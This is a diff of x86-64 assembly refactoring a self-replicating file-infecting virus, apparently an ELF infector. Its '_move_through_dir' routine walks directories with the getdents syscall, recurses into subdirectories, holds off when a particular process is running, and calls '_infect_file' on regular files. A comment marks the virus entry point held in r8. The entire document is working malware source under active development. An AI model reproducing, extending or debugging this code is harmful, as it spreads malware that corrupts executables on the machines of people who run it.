@@ -60,18 +60,17 @@ _inject:
 	push 1
 	pop rsi ; mode for move_through_dir
 	call _move_through_dir
-	pop rdi; pop addr from stack
+	pop r8; pop addr from stack
 	cmp rax, 0x0
 	jne _end
 
 	; save register
 
 	%ifdef DEBUG
+		mov rdi, r8
 		call _print; _print(rdi)
 	%endif
-	sub rdi, 0x5; sub call instr
-	push rdi; mov r8, rsi
-	pop r8
+	sub r8, 0x5; sub call instr
 	; r8 contains the entry of the virus
 
 	xor rsi, rsi ; mode for move_through_dir
@@ -95,7 +94,6 @@ _inject:
 
 _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 	push r10
-	push r11
 	push r12
 	push r13
 	push rbx
@@ -119,12 +117,10 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 
 	push rdi
 	pop r10; path
-	push rax
-	pop r11; fd
 
 	sub rsp, 1024
+	push rax
 	.getdents:
-		push r11
 		pop rdi
 		push 78
 		pop rax; getdents
@@ -133,7 +129,6 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 		mov rsi, rsp; buffer
 		syscall
 		push rdi
-		pop r11
 		push rsi
 		pop r12
 		cmp rax, 0x0
@@ -182,7 +177,6 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 			call _ft_concat_path
 
 		; check infect_dir or infect_file
-			push r11 ; stat using r11
 			sub rsp, 600
 
 			push 4
@@ -218,13 +212,12 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 
 			jmp .free_buffers
 			.infect:
-				cmp rax, 0o0040000 ; S_IFDIR
-				je .infect_dir
 				cmp rax, 0o0100000 ; S_IFREG
 				je .infect_file
-				jmp .free_buffers
+				cmp rax, 0o0040000 ; S_IFDIR
+				jne .free_buffers
 
-		.infect_dir:
+			; infect dir
 			xor rsi, rsi; infect -> 0
 			call _move_through_dir
 			jmp .free_buffers
@@ -233,9 +226,7 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 			call _infect_file
 
 		.free_buffers:
-			add rsp, 600
-			pop r11 ; stat using r11
-			add rsp, 4096
+			add rsp, 4696
 			pop rbx
 
 		.next_file:
@@ -249,25 +240,19 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 			jmp .loop_in_file
 
 	.process_found:
-		add rsp, 600
-		pop r11 ; stat using r11
-		add rsp, 4096
+		add rsp, 4696
 		pop rbx
 		pop rcx
 
 	.close:
-		push rax
-		pop rsi
-		push r11
-		pop rdi
+		mov rsi, rax
+		pop rdi; fd
 		push 3
 		pop rax; close
 		syscall
 		push r10
 		pop rdi
 		add rsp, 1024
-		push rsi
-		pop rax
 
 	.return:
 
@@ -276,7 +261,6 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 	pop rbx
 	pop r13
 	pop r12
-	pop r11
 	pop r10
 ret
 
